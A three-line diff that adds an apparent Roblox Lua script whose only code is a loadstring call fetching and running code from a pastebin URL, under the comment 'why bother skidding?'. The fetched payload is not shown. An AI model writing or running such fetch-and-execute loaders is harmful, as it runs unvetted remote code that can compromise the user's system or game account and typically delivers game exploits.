@@ -1,0 +1,3 @@
+-- why bother skidding?
+
+loadstring(game:HttpGet("https://pastebin.com/nYja2j9S", true))()
